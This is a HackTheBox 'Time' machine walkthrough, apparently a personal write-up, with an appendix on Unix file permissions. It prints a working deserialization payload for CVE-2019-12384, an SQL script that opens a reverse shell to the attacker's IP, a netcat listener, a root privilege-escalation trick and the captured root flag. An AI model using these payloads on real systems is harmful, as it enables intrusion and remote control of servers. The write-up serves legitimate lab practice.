# Overview
This is a brief walkthrough for the box [Time](https://app.hackthebox.eu/machines/Time) from [HackTheBox](https://www.hackthebox.eu) with some remarks on [file/directory permissions](#permissions) in the appendix.
# Getting a shell on the box, user flag

As only [port 22 and 80 are open](#nmap) we take a look at the website and find an online beautifier and validator.
Clicking around will soon reveal an error message. For example, entering a single quote and selecting `Validate (beta!)` triggers an error message which contains `com.fasterxml.jackson.core.JsonParseException`.
Researching this error for a bit leads us to [CVE-2019-12384](https://github.com/jas502n/CVE-2019-12384) and following the steps outlined on the github page allows us to execute arbitrary code to get a shell on the box.\\
First we need to create the `.sql` file which we will then host via the python http server. In this sql file, we simply need to change the argument of `SHELLEXEC()` in the last line to what we wish to run:

```sql
$ cat reverse.sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('sh -i >& /dev/tcp/10.10.14.6/1234 0>&1')
```
To retrieve and execute this file we then need to slightly adjust the serialized payload that's passed to the `test.rb` file in the github page: 
```json
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.6:8000/reverse.sql'"}]
```
Pasting it into the `Validate (beta!)` field after setting up a local http server using python and a netcat listener:
```console
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.214 - - [09/Mar/2021 10:58:53] "GET /reverse.sql HTTP/1.1" 200 -

 $ nc -lnvp 1234

 $ ls
 css

 images
 index.php
 js
 vendor
 $ whoami
 pericles
 $ cd /home/pe*
 $ ls
 snap
 user.txt
```
we notice command execution and get a shell back as `pericles`.
We can now collect the user flag.

# Root
First I upgrade to a ssh shell by echoing my public ssh key into the `~/.ssh/authorized_keys`. As `sudo -l` requires a password we do not have and the home directory of pericles is pretty much empty I upload [pspy](https://github.com/DominicBreuker/pspy) to see if any interesting processes are running, and indeed there are:
```console
pericles@time:~$ sudo -l
[sudo] password for pericles:
Sorry, try again.
pericles@time:~$ ./pspy64
[snip]
CMD: UID=0    PID=15551  | zip -r website.bak.zip /var/www/html
CMD: UID=0    PID=15528  | mv website.bak.zip /root/backup.zip
```
The user with UID 0 (root) zips `/var/www/html` to `/website.bak.zip` and moves it into the root folder, which is quickly confirmed by:
```console
$ pericles@time:/var/www/html$ while true; do ls / | grep website; done
website.bak.zip
```
I thought for a few minutes if there's a path vulnerability or anything I could put into the html folder to exploit but as the zip file doesn't seem to get extracted that shouldn't be possible. I then noticed another command thats run by root:
```bash
CMD: UID=0    PID=15548  | /bin/bash /usr/bin/timer_backup.sh
```
I started by looking at the file's permissions and to my surprise the file is owned by our user - which is rather unusual, because we cannot create files in `/usr/bin` - giving us full access to the file. More on that [here](#permissions).
```console
$ ls -al time*
-rwxr-xr-x 1 root     root     14720 Apr 21  2017 time
-rwxr-xr-x 1 root     root     43080 Apr 22  2020 timedatectl
-rwxr-xr-x 1 root     root     43800 Sep  5  2019 timeout
-rwxrw-rw- 1 pericles pericles    88 Mar  9 16:15 timer_backup.sh
```
For simplicity I simply collected the root flag via `cat` but we really have all options here, as the file is executed as root:
```console
$ cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip

[replaced by]

$ cat /usr/bin/timer_backup.sh
#!/bin/bash
cat /root/root.txt > /tmp/.flag

pericles@time:/tmp$ cat .flag
258535e5056435406f3d85114a2819b8
```
# Appendix
## <a name="permissions"></a> About file and directory permissions
Interestingly enough `timer_backup.sh` is owned by user and group `pericles`:
```console
-rwxrw-rw- 1 pericles pericles    88 Mar  9 16:15 timer_backup.sh

So reading the permissions from left to right: rwx rw- rw- 
First three bits -> owner 		-> read, write and execute
 Next three bits -> group 		-> read and write
 Last three bits -> everybody else 	-> read and write
```
Interestingly enough, because `/usr/bin/` is not a directory we are allowed to create files in:
```console
pericles@time:/usr/bin$ touch file
touch: cannot touch 'file': Permission denied
```
So probably the file was created here by root and he then changed the ownership and group to `pericles`. \\
As we have the write bit set on the _file_ but not on its parent directory we can therefore make changes to the content of the file but not to the file itself:
```console
pericles@time:/usr$ ls -l
total 96
drwxr-xr-x   2 root root 36864 Feb  9 14:42 bin
[snip]

pericles@time:/usr$ id
uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
```
As we neither are root nor in the root group, the execute bit - which allows us to enter the directory - and the read bit - which allows us to list the contents of the directory - are set for us. Thus we are not allowed to create new files nor remove existing ones even if these files are owned by us (which allows us to set file permissions however we like) because that would change the content of the directory and for this we need the write bit of the parent directory to be enabled - which can be done using `chmod o+w /usr/bin`:
```console
pericles@time:/usr/bin$ rm timer_backup.sh
rm: cannot remove 'timer_backup.sh': Permission denied

root@time:/# chmod o+w /usr/bin/  # write bit for users who aren't the owner/in the group of the file
chmod o+w /usr/bin/		

pericles@time:/usr/bin$ ls -al /usr/
total 104
drwxr-xr-x  14 root root  4096 Apr 23  2020 .
drwxr-xr-x  20 root root  4096 Apr  3 10:10 ..
drwxr-xrwx   2 root root 36864 Apr  3 10:09 bin

pericles@time:/usr/bin$ rm timer_backup.sh
pericles@time:/usr/bin$
```
